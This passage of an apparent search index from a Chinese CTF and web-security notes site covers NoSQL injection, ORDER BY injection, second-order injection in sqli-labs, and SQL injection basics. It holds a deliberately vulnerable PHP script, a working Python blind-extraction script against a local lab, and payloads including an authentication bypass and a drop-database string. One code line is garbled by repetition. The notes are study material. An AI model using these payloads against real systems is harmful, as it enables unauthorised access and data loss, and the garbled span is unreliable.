<p>\u5bc6\u7801\u91cd\u7f6e\u6210\u529f\uff01</p>"},{"location":"web/sql/NOSQL_%E6%B3%A8%E5%85%A5/nosql%E6%B3%A8%E5%85%A5/#nosql_1","title":"NoSQL\u6ce8\u5165\u5176\u4ed6\u65b9\u6cd5","text":"<p>\u521d\u5b66\u9636\u6bb5\uff0c\u6765\u81ea\u642c\u8fd0</p> <p>\uff081\uff09PHP\u6570\u7ec4\u6ce8\u5165</p> <p>\uff082\uff09MongoDB OR\u6ce8\u5165</p> <p>\uff083\uff09\u4efb\u610fJavaScript\u6ce8\u5165</p>"},{"location":"web/sql/NOSQL_%E6%B3%A8%E5%85%A5/nosql%E6%B3%A8%E5%85%A5/#mongodb-or","title":"MongoDB OR\u6ce8\u5165","text":"<p>SQL\u6ce8\u5165\u6f0f\u6d1e\u7684\u4e00\u4e2a\u5e38\u89c1\u539f\u56e0\u662f\u4ece\u5b57\u7b26\u4e32\u6587\u672c\u6784\u5efa\u67e5\u8be2\uff0c\u5176\u4e2d\u5305\u62ec\u672a\u4f7f\u7528\u9002\u5f53\u7f16\u7801\u7684\u7528\u6237\u8f93\u5165\u3002\u867d\u7136\u8fd9\u79cd\u6ce8\u5165\u65b9\u5f0f\u56e0\u4e3aJSON\u67e5\u8be2\u800c\u53d8\u5f97\u66f4\u96be\u5b9e\u73b0\uff0c\u4f46\u662f\u4e5f\u4e0d\u662f\u5b8c\u5168\u6ca1\u6709\u53ef\u80fd\u7684\u3002</p> <p>\u4e00\u4e9b\u5f00\u53d1\u8005\u53ef\u80fd\u91c7\u53d6\u8fd9\u6837\u7684\u65b9\u5f0f\u5c06\u7528\u6237\u8f93\u5165\u8f6c\u6210JSON\uff0c\u800c\u4e0d\u662f\u4f7f\u7528PHP\u81ea\u5e26\u7684array\u51fd\u6570\uff1a</p> <p></p> <p>\u5728\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u62fc\u63a5\u540e\u53ef\u4ee5\u5f97\u5230\uff1a</p> <p>```json\u2018 { username: 'tolkien', password: 'hobbit' } <pre><code>\u5982\u679c\u653b\u51fb\u8005\u6784\u9020\u8fd9\u6837\u7684\u6076\u610f\u8f93\u5165\uff1a\n\n[![img](nosql\u6ce8\u5165.assets/t018dc8990f7bfbcc60.png)](https://p3.ssl.qhimg.com/t018dc8990f7bfbcc60.png)\n\n\u62fc\u63a5\u540e\u7684\u7ed3\u679c\u4e3a\uff1a\n\n[![img](nosql\u6ce8\u5165.assets/t01515ca8f5019af267.png)](https://p3.ssl.qhimg.com/t01515ca8f5019af267.png)\n\n`$or`\u5c31\u8868\u793a\u5bf9\u540e\u9762\u7684`[]`\u4e2d\u7684\u5185\u5bb9\u8fdb\u884cOR\u8bed\u53e5\u64cd\u4f5c\uff0c\u800c\u4e00\u4e2a`{}`\u67e5\u8be2\u8bed\u53e5\u6c38\u8fdc\u8fd4\u56de`TRUE`\u3002\n\n\u6240\u4ee5\u8fd9\u6761\u8bed\u53e5\u5c31\u76f8\u5f53\u4e8e\uff1a\n\n```sql\nSELECT * FROM logins WHERE username = 'tolkien' AND (TRUE OR ('a' = 'a' AND password = '')) #successful MongoDB injection\n</code></pre></p> <p>\u53ea\u8981\u7528\u6237\u80fd\u591f\u63d0\u4f9b\u6b63\u786e\u7684\u7528\u6237\u540d\u5c31\u53ef\u4ee5\u76f4\u63a5\u767b\u5f55\uff0c\u800c\u4e0d\u9700\u8981\u5bc6\u7801\u6821\u9a8c\u3002</p>"},{"location":"web/sql/NOSQL_%E6%B3%A8%E5%85%A5/nosql%E6%B3%A8%E5%85%A5/#nosql-javascript","title":"NoSQL JavaScript\u6ce8\u5165","text":"<p>NoSQL\u6570\u636e\u5e93\u7684\u53e6\u4e00\u4e2a\u7279\u6027\u662f\u53ef\u4ee5\u6267\u884cJavaScript\u8bed\u53e5\u3002\u5982\u679c\u7528\u6237\u7684\u8f93\u5165\u4e3a\u8f6c\u4e49\u6216\u672a\u5145\u5206\u8f6c\u4e49\uff0c\u5219Javascript\u6267\u884c\u4f1a\u66b4\u9732\u4e00\u4e2a\u5371\u9669\u7684\u653b\u51fb\u9762\u3002 \u4f8b\u5982\uff0c\u4e00\u4e2a\u590d\u6742\u7684\u4e8b\u7269\u53ef\u80fd\u9700\u8981javascript\u4ee3\u7801\uff0c\u5176\u4e2d\u5305\u62ec\u4e00\u4e2a\u672a\u8f6c\u4e49\u7684\u7528\u6237\u8f93\u5165\u4f5c\u4e3a\u67e5\u8be2\u4e2d\u7684\u4e00\u4e2a\u53c2\u6570\u3002</p> <p>\u6bd4\u5982\u4ee5\u4e00\u4e2a\u5546\u5e97\u4e3a\u4f8b\uff0c\u5546\u5e97\u4e2d\u6709\u4e00\u7cfb\u5217\u5546\u54c1\uff0c\u6bcf\u4e2a\u5546\u54c1\u90fd\u6709\u4ef7\u683c\u548c\u91d1\u989d\u3002\u5f00\u53d1\u4eba\u5458\u60f3\u8981\u83b7\u53d6\u8fd9\u4e9b\u5b57\u6bb5\u7684\u603b\u548c\u6216\u8005\u5e73\u5747\u503c\uff0c\u5f00\u53d1\u8005\u7f16\u5199\u4e86\u4e00\u4e2amap reduce\u51fd\u6570\uff0c\u5176\u4e2d<code>$param</code>\u53c2\u6570\u63a5\u53d7\u7528\u6237\u7684\u8f93\u5165\uff1a</p> <p></p> <p>\u56e0\u4e3a\u6ca1\u6709\u5bf9\u7528\u6237\u7684\u8f93\u5165\u8fdb\u884c\u5145\u5206\u7684\u8fc7\u6ee4\uff0c\u6240\u4ee5\u653b\u51fb\u8005\u53ef\u4ee5\u6784\u9020\u8fd9\u6837\u7684payload\uff1a</p> <p></p> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\u7eff\u8272\u7684\u90e8\u5206\u7684\u4f5c\u7528\u662f\u95ed\u5408function()\u51fd\u6570\uff1b\u7ea2\u8272\u7684\u90e8\u5206\u662f\u653b\u51fb\u8005\u5e0c\u671b\u6267\u884c\u7684\u4efb\u610f\u4ee3\u7801\u3002\u6700\u540e\u6700\u4e00\u90e8\u5206\u84dd\u8272\u7684\u4ee3\u7801\u8c03\u7528\u4e00\u4e2a\u65b0\u7684map reduce\u51fd\u6570\uff0c\u4ee5\u5e73\u8861\u6ce8\u5165\u5230\u539f\u59cb\u8bed\u53e5\u4e2d\u7684\u4ee3\u7801\u3002</p> <p>\u5f97\u5230\u7684\u6548\u679c\u4e3a\uff1a</p> <p></p> <p>\u5982\u679c\u8981\u9632\u6b62JavaScript\u6ce8\u5165\u653b\u51fb\uff0c\u53ef\u4ee5\u76f4\u63a5\u7981\u6b62\u6570\u636e\u5e93\u8bed\u53e5\u4e2dJavaScript\u8bed\u53e5\u7684\u6267\u884c\uff08\u5728mongod.conf\u4e2d\u5c06<code>javascriptEnabled</code>\u8bbe\u4e3a<code>false</code>\uff09\u6216\u8005\u662f\u52a0\u5f3a\u5bf9\u7528\u6237\u8f93\u5165\u7684\u8fc7\u6ee4\u3002</p>"},{"location":"web/sql/NOSQL_%E6%B3%A8%E5%85%A5/nosql%E6%B3%A8%E5%85%A5/#_4","title":"\u7f13\u89e3\u4e0e\u68c0\u6d4b","text":"<p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7684\u662f\uff0c\u65e0\u8bba\u54ea\u79cd\u7c7b\u578b\u7684\u6ce8\u5165\u65b9\u6cd5\uff0c\u5b83\u4eec\u7684\u9632\u5fa1\u6216\u8005\u8bf4\u662f\u7f13\u89e3\u63aa\u65bd\uff0c\u6700\u91cd\u8981\u7684\u4e00\u70b9\u5c31\u662f\uff0c\u6c38\u8fdc\u4e0d\u8981\u65e0\u6761\u4ef6\u76f8\u4fe1\u7528\u6237\u7684\u8f93\u5165\uff0c\u5bf9\u4e8e\u6765\u81ea\u5916\u90e8\u7684\u8f93\u5165\uff0c\u4e00\u5b9a\u8981\u5c0f\u5fc3\u5c0f\u5fc3\u518d\u5c0f\u5fc3\u3002</p>"},{"location":"web/sql/SQL_Injection/order_by_%E6%8E%92%E5%BA%8F%E6%B3%A8%E5%85%A5/","title":"order by \u6392\u5e8f\u6ce8\u5165","text":"<p>\u5199\u4e0d\u52a8\u4e86\uff0ccopy\u4e86</p> <p>\u9996\u5148\u5047\u8bbe\u6709\u8fd9\u6837\u4e00\u5f20\u8868</p> <p></p> <p>\u6709\u4ee5\u4e0b\u4ee3\u7801</p> <pre><code>&lt;?php\n$servername = \"localhost\";\n$username = \"root\";\n$password = \"\";\n$dbname = \"ctf\";\n$conn = new mysqli($servername, $username, $password, $dbname);\n\nfunction check($s){\n         if(preg_match(\"/\\)|\\(|_|\\.|\\|/i\",$s))  #()_.|\n       {    \n             die('hack!'); \n       }\n   }\n$username=$_GET['username'];\ncheck($username);\n\n$sql = \"select * from user where username='$username'\";\n$result = $conn-&gt;query($sql);\n\nif ($result-&gt;num_rows &gt; 0) {\n    if($row = $result-&gt;fetch_assoc()) {\n        echo \"username: \" . $row[\"username\"].\"&lt;br&gt;\";\n    }\n}\n$conn-&gt;close();\n?&gt;\n</code></pre> <p>\u56e0\u4e3a()_.|\u88ab\u8fc7\u6ee4\uff0c\u6240\u4ee5\u6211\u4eec\u65e0\u6cd5\u4eceinformation_schema\u548c\u51fd\u6570\u83b7\u53d6\u4fe1\u606f\u3002</p> <p>\u73b0\u5728\u6211\u4eec\u8981\u83b7\u53d6admin\u7684flag\u7684hash\uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u77e5\u9053\u5b57\u6bb5\u540d\uff0c\u4e14\u6ca1\u6709.\u4e0d\u80fd\u4f7f\u7528\u522b\u540d\u6216\u5b50\u67e5\u8be2\u7684\u65b9\u5f0f\u83b7\u53d6\uff0c\u53ef\u4ee5\u4f7f\u7528\u8fd9\u6837\u7684\u65b9\u6cd5\u3002</p> <p>\u4e0b\u9762\u6b63\u5f0f\u5f00\u59cb</p> <p>\u9996\u5148\u6211\u4eec\u77e5\u9053order by \u53ef\u4ee5\u6392\u5e8f\uff0c\u6240\u4ee5\u5229\u7528\u8fd9\u4e00\u70b9\u53ef\u4ee5\u8fdb\u884c\u5b57\u7b26\u4e32\u6bd4\u8f83\uff0c\u5982\u4e0b\u5c31\u662forder by \u5bf9admin\u8fdb\u884c\u5462\u6bd4\u8f83\u6211\u4eec\u73b0\u5728\u5c31\u5df2\u7ecf\u786e\u5b9a\u524d\u4e24\u4e2a\u5b57\u6bcd\u4e3aad\u4e86</p> <p></p> <p></p> <p>\u540c\u7406</p> <p></p> <p></p> <p>\u73b0\u5728\u6211\u4eec\u77e5\u9053admin\u7684flag\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e3a7\u4e86\uff0c\u7ee7\u7eed</p> <p></p> <p></p> <p>\u73b0\u5728\u6211\u4eec\u77e5\u9053\uff0c\u524d\u4e24\u4e2a\u5b57\u7b26\u4e3a79\u4e86 //9\u7684ascii\u4e3a57\u800c:\u7684ascii\u4e3a58\uff0c\u6240\u4ee5:\u6bd49\u5927</p> <p>\u4ee5\u6b64\u6211\u4eec\u53ef\u4ee5\u5199\u51fa\u4ee5\u4e0b\u811a\u672c</p> <pre><code>import requests\n\nurl= 'http://127.0.0.1/mysql.php'\nflag=''\nfor i in range(50):\n    for j in range(48,128):\n        payload=\"?username=xxx' or 1=1 union select 1,2,'%s' order by 3 limit 1,2;\\x00\"%(flag+chr(j))\n        r=requests.get(url+payload).text\n        print j\n        if 'admin' in r:\n            flag+=chr(j-1)\n            print flag.lower() #793914c9c583d9d86d0f4ed8c521b0c1\n            break\n</code></pre>"},{"location":"web/sql/SQL_Injection/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/","title":"\u4e8c\u6b21\u6ce8\u5165","text":"<p>\u4e8c\u6b21\u6ce8\u5165\u9700\u8981\u5177\u5907\u7684\u4e24\u4e2a\u6761\u4ef6\uff1a</p> <p>\uff081\uff09\u7528\u6237\u5411\u6570\u636e\u5e93\u63d2\u5165\u6076\u610f\u8bed\u53e5\uff08\u5373\u4f7f\u540e\u7aef\u4ee3\u7801\u5bf9\u8bed\u53e5\u8fdb\u884c\u4e86\u8f6c\u4e49\uff0c\u5982mysql_escape_string\u3001mysql_real_escape_string\u8f6c\u4e49\uff09</p> <p>\uff082\uff09\u6570\u636e\u5e93\u5bf9\u81ea\u5df1\u5b58\u50a8\u7684\u6570\u636e\u975e\u5e38\u653e\u5fc3\uff0c\u76f4\u63a5\u53d6\u51fa\u6076\u610f\u6570\u636e\u7ed9\u7528\u6237</p> <p>\u4e0b\u9762\u7684\u4f8b\u5b50\u7a0d\u5fae\u7422\u78e8\u4e00\u4e0b\u5c31\u80fd\u770b\u61c2</p> <p>\uff081\uff09\u5728sqli_libs\u7684\u7b2c24\u5173,\u5176\u9875\u9762\u5982\u4e0b\u6240\u793a:</p> <p></p> <p>\uff082\uff09\u5f53\u6211\u4eec\u70b9\u51fbForgot your password?\u65f6\uff0c\u51fa\u73b0\u63d0\u793a\uff1a</p> <p></p> <p>\uff083\uff09\u56e0\u6b64\u53ef\u4ee5\u5c1d\u8bd5\u5728\u6ce8\u518c\u9875\u9762\u8fdb\u884c\u4e8c\u6b21\u6ce8\u5165\uff0c\u9996\u5148\uff0c\u6211\u4eec\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\uff0c\u540d\u4e3a\uff1aadmin'#   ,\u5bc6\u7801\u4e3a\uff1a123456</p> <p></p> <p>\uff084\uff09\u6ce8\u518c\u6210\u529f\uff0c\u5c1d\u8bd5\u767b\u5f55admin\u2018#  \uff0c\u7136\u540e\u53ef\u4ee5\u67e5\u770b\u4e00\u4e0bphpmyadmin\u5185\u5b58\u50a8\u60c5\u51b5</p> <p></p> <p></p> <p></p> <p>\uff085\uff09\u800c\u8fd9\u65f6\u7684admin\u539f\u5bc6\u7801\u662fadmin\uff0c\u5e76\u4e14\u4e24\u4e2a\u8d26\u53f7\u90fd\u5b58\u50a8\u5728\u6570\u636e\u5e93\u5185\u7684\u3002\u5f53\u6211\u4eec\u91cd\u65b0\u4fee\u6539admin'#\u7684\u5bc6\u7801\u7684\u65f6\u5019\uff0c\u8fd9\u91cc\u4fee\u6539\u4e3a\uff1a12345678\uff1b\u53ef\u4ee5\u53d1\u73b0\u4e8c\u6b21\u6ce8\u5165\u7684\u5a01\u529b\u6240\u5728\u3002admin\u7684\u5bc6\u7801\u88ab\u4fee\u6539\u4e3a\u4e86\uff1a12345678\uff1b\u800cadmin'#\u7528\u6237\u7684\u5bc6\u7801\u5e76\u6ca1\u6709\u53d1\u751f\u53d8\u5316\u3002</p> <p></p> <p></p> <p>\uff086\uff09\u4ee3\u7801\u5ba1\u8ba1\uff0c\u5c1d\u8bd5\u5206\u6790\u6e90\u7801\uff0c\u51fa\u73b0\u95ee\u9898\u7684\u9875\u9762\u5f88\u663e\u7136\u662f\u6ce8\u518c\u9875\u9762\uff0c\u4e0e\u5bc6\u7801\u4fee\u6539\u91cd\u7f6e\u7684\u9875\u9762\u3002</p> <p>\u6ce8\u518c\u7528\u6237\u65f6\uff1a          \u4ec5\u5bf9\u7279\u6b8a\u5b57\u7b26\u8fdb\u884c\u4e86\u8f6c\u4e49\uff0c\u5224\u65ad\u8f93\u5165\u4e24\u6b21\u5bc6\u7801\u662f\u5426\u4e00\u81f4\uff0c\u7136\u540e\u5c06\u7528\u6237\u952e\u5165\uff0c\u5c06\u6570\u636e\u63d2\u5165\u81f3\u6570\u636e\u5e93\u3002sql = \"insert into users ( username, password) values(\\\"username\\\", \\\"$pass\\\")\"</p> <p>\u8fd9\u91cc\u76f4\u63a5\u63d2\u5165\u4e86\u6570\u636e</p> <p>\u4fee\u6539\u5bc6\u7801\u65f6\uff1ausername= _SESSION[\"username\"];//\u76f4\u63a5\u53d6\u51fa\u4e86\u6570\u636e\u5e93\u7684\u6570\u636esql = \"UPDATE users SET PASSWORD='sql = \"UPDATE users SET PASSWORD='sql = \"UPDATE users SET PASSWORD='sql = \"UPDATE users SET PASSWORD='pass' where username='username' and password='curr_pass' \";//\u5bf9\u8be5\u7528\u6237\u7684\u5bc6\u7801\u8fdb\u884c\u66f4\u65b0$sql = \"UPDATE users SET PASSWORD='12345678' where username='admin\u2018#</p> <p>\u6267\u884c\u6210\u529f\uff01</p> <p>[CISCN2019 \u534e\u5317\u8d5b\u533a Day1 Web5]CyberPunk</p>"},{"location":"web/sql/SQL_Injection/%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/","title":"\u57fa\u672c\u539f\u7406","text":"<p>\u521d\u89c1\u53ef\u4ee5\u770b\u770b\uff0c\u5176\u4ed6\u968f\u610f</p> <p>\u6240\u8c13SQL\u6ce8\u5165\uff0c\u5c31\u662f\u901a\u8fc7\u628aSQL\u547d\u4ee4\u63d2\u5165\u5230Web\u8868\u5355\u9012\u4ea4\u6216\u8f93\u5165\u57df\u540d\u6216\u9875\u9762\u8bf7\u6c42\u7684\u67e5\u8be2\u5b57\u7b26\u4e32\uff0c\u6700\u7ec8\u8fbe\u5230\u6b3a\u9a97\u670d\u52a1\u5668\u6267\u884c\u6076\u610f\u7684SQL\u547d\u4ee4\uff0c\u6bd4\u5982\u5148\u524d\u7684\u5f88\u591a\u5f71\u89c6\u7f51\u7ad9\u6cc4\u9732VIP\u4f1a\u5458\u5bc6\u7801\u5927\u591a\u5c31\u662f\u901a\u8fc7WEB\u8868\u5355\u9012\u4ea4\u67e5\u8be2\u5b57\u7b26\u66b4\u51fa\u7684\uff0c\u8fd9\u7c7b\u8868\u5355\u7279\u522b\u5bb9\u6613\u53d7\u5230SQL\u6ce8\u5165\u5f0f\u653b\u51fb\uff0e\u5f53\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u8f93\u5165\u5185\u5bb9\u6765\u6784\u9020\u52a8\u6001sql\u8bed\u53e5\u4ee5\u8bbf\u95ee\u6570\u636e\u5e93\u65f6\uff0c\u4f1a\u53d1\u751fsql\u6ce8\u5165\u653b\u51fb\u3002\u5982\u679c\u4ee3\u7801\u4f7f\u7528\u5b58\u50a8\u8fc7\u7a0b\uff0c\u800c\u8fd9\u4e9b\u5b58\u50a8\u8fc7\u7a0b\u4f5c\u4e3a\u5305\u542b\u672a\u7b5b\u9009\u7684\u7528\u6237\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u6765\u4f20\u9012\uff0c\u4e5f\u4f1a\u53d1\u751fsql\u6ce8\u5165\u3002</p> <p>SQL\u6ce8\u5c04\u80fd\u4f7f\u653b\u51fb\u8005\u7ed5\u8fc7\u8ba4\u8bc1\u673a\u5236\uff0c\u5b8c\u5168\u63a7\u5236\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u7684\u6570\u636e\u5e93\u3002 SQL\u662f\u7ed3\u6784\u5316\u67e5\u8be2\u8bed\u8a00\u7684\u7b80\u79f0\uff0c\u5b83\u662f\u8bbf\u95ee\u6570\u636e\u5e93\u7684\u4e8b\u5b9e\u6807\u51c6\u3002\u76ee\u524d\uff0c\u5927\u591a\u6570Web\u5e94\u7528\u90fd\u4f7f\u7528SQL\u6570\u636e\u5e93\u6765\u5b58\u653e\u5e94\u7528\u7a0b\u5e8f\u7684\u6570\u636e\u3002\u51e0\u4e4e\u6240\u6709\u7684Web\u5e94\u7528\u5728\u540e\u53f0 \u90fd\u4f7f\u7528\u67d0\u79cdSQL\u6570\u636e\u5e93\u3002\u8ddf\u5927\u591a\u6570\u8bed\u8a00\u4e00\u6837\uff0cSQL\u8bed\u6cd5\u5141\u8bb8\u6570\u636e\u5e93\u547d\u4ee4\u548c\u7528\u6237\u6570\u636e\u6df7\u6742\u5728\u4e00\u8d77\u7684\u3002\u5982\u679c\u5f00\u53d1\u4eba\u5458\u4e0d\u7ec6\u5fc3\u7684\u8bdd\uff0c\u7528\u6237\u6570\u636e\u5c31\u6709\u53ef\u80fd\u88ab\u89e3\u91ca\u6210\u547d\u4ee4\uff0c \u8fd9\u6837\u7684\u8bdd\uff0c\u8fdc\u7a0b\u7528\u6237\u5c31\u4e0d\u4ec5\u80fd\u5411Web\u5e94\u7528\u8f93\u5165\u6570\u636e\uff0c\u800c\u4e14\u8fd8\u53ef\u4ee5\u5728\u6570\u636e\u5e93\u4e0a\u6267\u884c\u4efb\u610f\u547d\u4ee4\u4e86\u3002</p> <p>SQL\u6ce8\u5165\u5f0f\u653b\u51fb\u7684\u4e3b\u8981\u5f62\u5f0f\u6709\u4e24\u79cd\u3002\u4e00\u662f\u76f4\u63a5\u5c06\u4ee3\u7801\u63d2\u5165\u5230\u4e0eSQL\u547d\u4ee4\u4e32\u8054\u5728\u4e00\u8d77\u5e76\u4f7f\u5f97\u5176\u4ee5\u6267\u884c\u7684\u7528\u6237\u8f93\u5165\u53d8\u91cf\u3002\u7531\u4e8e\u5176\u76f4\u63a5\u4e0eSQL\u8bed\u53e5\u6346\u7ed1\uff0c\u6545\u4e5f\u88ab\u79f0\u4e3a\u76f4\u63a5\u6ce8\u5165\u5f0f\u653b\u51fb\u6cd5\u3002\u4e8c\u662f\u4e00\u79cd\u95f4\u63a5\u7684\u653b\u51fb\u65b9\u6cd5\uff0c\u5b83\u5c06\u6076\u610f\u4ee3\u7801\u6ce8\u5165\u8981\u5728\u8868\u4e2d\u5b58\u50a8\u6216\u8005\u4f5c\u4e3a\u539f\u4e66\u636e\u5b58\u50a8\u7684\u5b57\u7b26\u4e32\u3002\u5728\u5b58\u50a8\u7684\u5b57\u7b26\u4e32\u4e2d\u4f1a\u8fde\u63a5\u5230\u4e00\u4e2a\u52a8\u6001\u7684SQL\u547d\u4ee4\u4e2d\uff0c\u4ee5\u6267\u884c\u4e00\u4e9b\u6076\u610f\u7684SQL\u4ee3\u7801\u3002\u6ce8\u5165\u8fc7\u7a0b\u7684\u5de5\u4f5c\u65b9\u5f0f\u662f\u63d0\u524d\u7ec8\u6b62\u6587\u672c\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u8ffd\u52a0\u4e00\u4e2a\u65b0\u7684\u547d\u4ee4\u3002\u5982\u4ee5\u76f4\u63a5\u6ce8\u5165\u5f0f\u653b\u51fb\u4e3a\u4f8b\u3002\u5c31\u662f\u5728\u7528\u6237\u8f93\u5165\u53d8\u91cf\u7684\u65f6\u5019\uff0c\u5148\u7528\u4e00\u4e2a\u5206\u53f7\u7ed3\u675f\u5f53\u524d\u7684\u8bed\u53e5\u3002\u7136\u540e\u518d\u63d2\u5165\u4e00\u4e2a\u6076\u610fSQL\u8bed\u53e5\u5373\u53ef\u3002\u7531\u4e8e\u63d2\u5165\u7684\u547d\u4ee4\u53ef\u80fd\u5728\u6267\u884c\u524d\u8ffd\u52a0\u5176\u4ed6\u5b57\u7b26\u4e32\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u5e38\u5e38\u7528\u6ce8\u91ca\u6807\u8bb0\u201c\u2014\u201d\u6765\u7ec8\u6b62\u6ce8\u5165\u7684\u5b57\u7b26\u4e32\u3002\u6267\u884c\u65f6\uff0c\u7cfb\u7edf\u4f1a\u8ba4\u4e3a\u6b64\u540e\u8bed\u53e5\u4f4d\u6ce8\u91ca</p> <p>\u603b\u7684\u6765\u8bf4\uff0c\u5c31\u662f\u7528\u6237\u8f93\u5165\u4e86\u4e00\u4e2a\u6570\u636e\uff0c\u670d\u52a1\u5668\u5c06\u4ed6\u751f\u786c\u7684\u62fc\u63a5\u6210\u4e86\u4e00\u6761SQL\u8bed\u53e5\u3002\u7136\u540e\u653e\u5728\u670d\u52a1\u5668\u4e0a\u9762\u53bb\u6267\u884c\u5e76\u53cd\u9988\u7ed9\u653b\u51fb\u8005\u3002\u5982\u679c\u67e5\u8be2\u8bed\u53e5\u53ef\u4ee5\u88ab\u63a7\u5236\uff0c\u76f8\u5f53\u4e8e\u653b\u51fb\u8005\u80fd\u591f\u62ff\u5230\u540e\u53f0\u6570\u636e\u5e93\u4e2d\u7684\u5168\u90e8\u6570\u636e\uff08\u901a\u5e38\u4e5f\u5305\u542b\u8d26\u53f7\u548c\u5bc6\u7801\uff09\uff0c\u5371\u5bb3\u4e25\u91cd\u3002</p>"},{"location":"web/sql/SQL_Injection/%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/#sql","title":"\u57fa\u672cSQL\u6ce8\u5165","text":"<p>SQL\u6ce8\u5165\u7684\u6838\u5fc3\u662f\u95ed\u5408\uff0c\u901a\u8fc7\u4f20\u8f93\u6570\u636e\u4fee\u6539\uff0c\u64cd\u7eb5\u670d\u52a1\u5668\u7aef\u7684sql\u8bed\u53e5</p> <p>\u6316\u6398\u65f6\u7684\u603b\u4f53\u601d\u8def</p> <p>1\uff1a\u5bfb\u627e\u5230SQL\u6ce8\u5165\u7684\u4f4d\u7f6e</p> <p>2\uff1a\u5224\u65ad\u670d\u52a1\u5668\u7c7b\u578b\u548c\u540e\u53f0\u6570\u636e\u5e93\u7c7b\u578b\uff08mysql\u6700\u591a\uff0c\u4e0d\u8fc7sqlite\u6700\u8fd1\u4e5f\u591a\u4e86\u8d77\u6765\uff09</p> <p>3\uff1a\u9488\u5bf9\u4e0d\u540c\u7684\u670d\u52a1\u5668\u548c\u6570\u636e\u5e93\u7279\u70b9\u8fdb\u884cSQL\u6ce8\u5165\u653b\u51fb\uff08\u4f1a\u6709\u4e9b\u5dee\u522b\uff0c\u4f46\u57fa\u672c\u7684\u8fd8\u662f\u8981\u4f1a\u7684\uff0c\u53d8\u4e0d\u79bb\u5176\u5b97\uff09</p> <p>\u8fdb\u5165\u4e3e\u4f8b</p> <pre><code>\"select * from user_table where username=' username ' and password='  password '\";\nPlain Text\n</code></pre> <p>\u8fd9\u6761\u8bed\u53e5\u5c31\u662f\u666e\u901a\u7684\u67e5\u8be2\u8bed\u53e5\uff0c\u4ece\u6570\u636e\u5e93\u4e2d\u53d6\u51fausername\u548cpassword\u3002</p> <p>\u6ca1\u6709\u7684\u8bdd\u5c31\u51fa\u9519\uff0c\u767b\u5f55\u4e0d\u4e86\uff0c\u975e\u5e38\u7b80\u5355</p> <p>\u4e5f\u5c31\u662f\u8bf4\u73b0\u5728username\u548cpassword\u7684\u53c2\u6570\u6211\u4eec\u53ef\u4ee5\u63a7\u5236</p> <p>\u7136\u540e\u6211\u4eec\u8f93\u5165\u8bed\u53e5</p> <p>username=1' or 1=1--</p> <p>\u7a0d\u5fae\u5206\u6790\u4e00\u4e0b</p> <p>--\u8868\u793a\u6ce8\u91ca\uff0c\u4f1a\u5ffd\u7565\u6389\u540e\u9762\u7684\u8bed\u53e5</p> <p>\u6574\u4e2asql\u6ce8\u5165\u8bed\u53e5\u5c31\u53d8\u6210\u4e86</p> <pre><code>select * from user_table where username='1' or 1=1--[[[[[' and password='  password ']]]]]\u610f\u601d\u4e00\u4e0b\uff0c\u8868\u6ce8\u91ca--\u5176\u5b9e\u4e5f\u53ef\u4ee5\u7528#\u6765\u66ff\u4ee3\nPlain Text\n</code></pre> <p>\u6211\u4eec\u53d1\u73b0\uff0c\u524d\u9762\u7684\u4e00\u4e2a\u5728\u539f\u8bed\u53e5\u4e2d\u7684\u5f15\u53f7\u548c\u6211\u4eec\u8f93\u5165\u7684\u4e00\u4e2a\u5f15\u53f7\u4e00\u8d77\u7ec4\u6210\u4e86username\u540e\u9762\u53c8\u591a\u4e86\u4e86\u4e00\u4e2a1=1\uff0c\u8fd9\u662f\u4e00\u5b9a\u4f1a\u6210\u7acb\u7684\u3002\u7136\u540e\u6574\u53e5\u8bdd\u7684\u903b\u8f91\uff0c\u7531\u4e8e\u6216\uff08or\uff09\u7684\u51fa\u73b0\uff0c\u4e00\u5b9a\u4e3a\u771f\uff0c\u597d\u7684\uff0c\u6574\u6761\u8bed\u53e5\u6709\u53ef\u80fd\u5c31\u5728\u4ee3\u7801\u91cc\u8fd4\u56deture\uff0c\u7136\u540e\u8eab\u4efd\u8ba4\u8bc1\u901a\u8fc7\u3002\u8fd9\u5c31\u662f\u76f8\u5bf9\u7b80\u5355\u7684sql\u6ce8\u5165\u3002</p> <p>\u8fd9\u91cc\u6ca1\u6709\u4e00\u70b9\u8fc7\u6ee4\uff0c\u800c\u4e14\u53ef\u4ee5\u6267\u884c</p> <p>\u5982\u679c\u6211\u4eec\u8f93\u51651'; drop database()--\u6216\u8005\u5176\u4ed6\u7206\u51fa\u6570\u636e\u5e93\u7684\u8bed\u53e5\u3002</p> <p>\u8fd9\u6837\u7684\u653b\u51fb\u5bf9\u4e8e\u4e00\u4e2a\u7f51\u7ad9\u6216\u8005\u662f\u670d\u52a1\u5668\uff0c\u6740\u4f24\u529b\u4e0d\u8a00\u800c\u55bb\u3002</p> <p>\u800c\u4e14sql\u6ce8\u5165\u5e76\u4e0d\u662f\u56e0\u4e3a\u67d0\u4e9b\u5e95\u5c42\u51fa\u73b0\u4e86\u6f0f\u6d1e\uff0c\u5355\u7eaf\u662f\u7ba1\u7406\u5458\u7684\u914d\u7f6e\u4e0d\u5f53</p> <p>R.I.P.</p>"},{"location":"web/sql/SQL_Injection/%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/#_2","title":"\u57fa\u672c\u64cd\u4f5c\u8bed\u53e5","text":"<p>\u8fd9\u4e2a\u5982\u679c\u5168\u8bb0\u5f97\u7684\u8bdd\u6700\u597d\uff0c\u6211\u8001\u662f\u5fd8\u8bb0</p> <p>\u4e86\u89e3\u653b\u51fb\u539f\u7406\u4e4b\u524d\u653e\u4e0a\u6b63\u5e38\u4f7f\u7528\u6240\u7528\u7684\u8bed\u53e5\uff08\u8fd9\u91cc\u662fmysql\uff0csqlite\u4f1a\u6709\u4e00\u4e9b\u4e0d\u540c\uff0coracle\u4e5f\u633a\u7c7b\u4f3c\uff09</p> <pre><code>\u5f53\u524d\u7528\u6237\uff1aselect user() 